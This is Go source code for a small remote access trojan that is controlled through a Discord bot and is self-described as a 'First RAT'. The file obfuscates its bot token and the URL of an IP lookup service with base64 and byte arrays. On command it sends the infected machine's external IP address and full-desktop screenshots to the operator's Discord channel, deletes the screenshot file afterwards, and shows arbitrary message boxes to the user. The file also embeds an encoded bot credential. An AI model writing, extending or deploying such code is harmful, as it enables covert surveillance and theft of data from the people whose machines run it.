package main

import (
	"encoding/base64"
	"fmt"
	"image"
	"image/png"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"github.com/bwmarrin/discordgo"
	"github.com/kbinani/screenshot"
	"github.com/sqweek/dialog"
)

// Variables used for command line parameters
var (
	Token  = "TVRFeE9URTRNVE13TURVeE1UZ3dNVFF5TkEuRzVMSDNKLmFsOUxObzM2MDhtUUZXaG1zakVVY3VJNC1OWkNhZHoyby1KTGxN"
	Prefix = "$"
	IP_API = []byte{104, 116, 116, 112, 58, 47, 47, 97, 112, 105, 46, 105, 112, 105, 102, 121, 46, 111, 114, 103}

	// IP API request counter.
	// This is used for checking if the MAX_REQ_ATTEMPTS has been reached.
	RequestsToAPI int
	BaseChannelID = "1114926685826076713"
)

func main() {
	// Create a new Discord session using the provided bot token.
	rawDecodedToken, err := base64.StdEncoding.DecodeString(Token)
	if err != nil {
		fmt.Println("error decoding token,", err)
		return
	}
	dg, err := discordgo.New("Bot " + string(rawDecodedToken))
	if err != nil {
		fmt.Println("error creating Discord session,", err)
		return
	}

	// Register the messageCreate func as a callback for MessageCreate events.
	dg.AddHandler(messageCreate)
	dg.AddHandler(onReady)

	// In this example, we only care about receiving message events.
	dg.Identify.Intents = discordgo.IntentsGuildMessages

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		fmt.Println("error opening connection,", err)
		return
	}

	// Wait here until CTRL-C or other term signal is received.
	fmt.Println("Bot is now running.  Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
	<-sc

	// Cleanly close down the Discord session.
	dg.Close()
}

func onReady(s *discordgo.Session, event *discordgo.Ready) {
	s.UpdateListeningStatus("First RAT")
	s.ChannelMessageSend(BaseChannelID, "Bot is now running.  Press CTRL-C to exit.")
}

func GetExternalIP() string {
	RequestsToAPI++

	// Use the net/http package to make a GET request to the "http://api.ipify.org" API.
	resp, err := http.Get(string(IP_API))
	if err != nil {
		// If there was an error with the http.Get request, print it to console.
		fmt.Println("Error getting IP address: ", err)
	}

	// Close the response body when the function returns.
	defer resp.Body.Close()

	// Create a byte slice to store the response body.
	var ipBuilder strings.Builder

	// Read the response body to retrieve the IP address as a string.
	buffer := make([]byte, 1024)
	for {
		n, err := resp.Body.Read(buffer)
		if n > 0 {
			ipBuilder.Write(buffer[:n])
		}
		if err != nil {
			break
		}
	}

	// Return the IP address as a string.
	return ipBuilder.String()
}

func save(img *image.RGBA, filePath string) {
	file, err := os.Create(filePath)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	png.Encode(file, img)
}

func captSs() {
	// Capture each displays.
	n := screenshot.NumActiveDisplays()
	if n <= 0 {
		panic("Active display not found")
	}

	var all image.Rectangle = image.Rect(0, 0, 0, 0)

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		all = bounds.Union(all)
		// fileName := fmt.Sprintf("%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())
		// save(img, fileName)

		// fmt.Printf("#%d : %v \"%s\"\n", i, bounds, fileName)
	}

	// Capture all desktop region into an image.
	fmt.Printf("%v\n", all)
	img, err := screenshot.Capture(all.Min.X, all.Min.Y, all.Dx(), all.Dy())
	if err != nil {
		panic(err)
	}
	save(img, "all.png")
}

func remove_File() {
	err := os.Remove("all.png")
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("File Deleted")
}

// This function will be called (due to AddHandler above) every time a new
// message is created on any channel that the authenticated bot has access to.
func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {

	// Ignore all messages created by the bot itself
	// This isn't required in this specific example but it's a good practice.
	fmt.Printf("Message: %+v\n", m.Content)
	fmt.Printf("User data: %+v\n", m.Author)

	if m.Author.ID == s.State.User.ID {
		return
	}
	// If the message is "ping" reply with "Pong!"
	if m.Content == "ping" {
		s.ChannelMessageSend(m.ChannelID, "Pong!")
	}

	// If the message is "pong" reply with "Ping!"
	if m.Content == "pong" {
		s.ChannelMessageSend(m.ChannelID, "Ping!")
	}

	if m.Content == Prefix+"ip" {
		rs := "VGhlIElQIG9mIHRoZSBjbGllbnQgaXM6IA=="
		fs, err := base64.StdEncoding.DecodeString(rs)
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "error decoding token")
		}
		s.ChannelMessageSend(m.ChannelID, string(fs)+GetExternalIP())
	}

	if m.Content == Prefix+"ss" {
		captSs()
		file, err := os.Open("all.png")
		if err != nil {
			// Handle error
			return
		}

		s.ChannelFileSend(m.ChannelID, "TheFile.png", file)
		defer remove_File()
		defer file.Close()
	}

	if strings.Contains(m.Content, Prefix+"messagebox") {
		str := strings.SplitN(m.Content, " ", 3)
		if len(str) >= 3 {
			title := str[1]
			message := str[2]
			s.ChannelMessageSend(m.ChannelID, "Message box sent with title "+title+" and message "+message)
			dialog.Message(message).Title(title).Info()
		} else {
			fmt.Println(m.Content)
		}
	}
}
